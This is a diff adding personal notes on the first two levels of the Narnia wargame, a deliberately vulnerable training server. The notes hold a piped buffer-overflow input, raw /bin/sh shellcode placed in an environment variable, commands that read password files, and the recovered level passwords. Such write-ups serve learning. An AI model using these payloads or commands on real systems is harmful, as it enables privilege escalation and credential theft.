@@ -1,0 +1,97 @@
+
+Basic Exploits
+
+
+narnia0:narnia0
+
+Level 0:
+
+
+These give you the source code and execuatables in /narnia/narnia#.c
+Running the exe we get:
+
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: s
+buf: s
+val: 0x41414141
+WAY OFF!!!!
+
+Key things looking at this levels source code:
+
+long val=0x41414141;
+char buf[20];
+
+scanf("%24s",&buf);
+
+So we need to set val to 0xdeadbeef using a buffer overflow
+
+Just spamming 0s we do see that it leaks into val
+
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: 0000000000000000000000000
+buf: 000000000000000000000000
+val: 0x30303030
+
+so it looks like the characters just need to be 0xdeadbeef past the 20 char buf
+
+Converted deadbeef to utf8 
+
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: 00000000000000000000ޭ��
+buf: 00000000000000000000ޭ�
+                          val: 0xbfefadde
+WAY OFF!!!!
+
+
+Looks to like I entered it backward damned little endian!
+
+I couldn't enter it manually. The text encoding gets all messed up and passes the wrong value. 
+
+Have to pipe it and then pass command to run after:
+
+narnia0@gibson:/narnia$  { printf "00000000000000000000\xef\xbe\xad\xde\n" & sleep 0.1; echo "cat /etc/narnia_pass/narnia1"; } | ./narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: 00000000000000000000ﾭ�
+                                                val: 0xdeadbeef
+eaa6AjYMBB
+
+
+narnia1:eaa6AjYMBB
+
+
+Level 2: 
+
+
+int main(){
+    int (*ret)();
+
+    if(getenv("EGG")==NULL){
+        printf("Give me something to execute at the env-variable EGG\n");
+        exit(1);
+    }
+
+    printf("Trying to execute EGG!\n");
+    ret = getenv("EGG");
+    ret();
+
+    return 0;
+}
+
+
+Looks like I have to put code in EGG env variable
+It will be loaded as a function and run
+
+Pull shellcode from here: https://www.exploit-db.com/shellcodes/13316
+setreuid(geteuid(), geteuid()) + execve("/bin/sh",0,0)
+
+narnia1@gibson:/narnia$ export EGG=$(printf "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80")
+narnia1@gibson:/narnia$ ./narnia1
+Trying to execute EGG!
+$ whoami
+narnia2
+$ cat /etc/narnia_pass/narnia2
+Zzb6MIyceT
+
+narnia2:Zzb6MIyceT
+
+
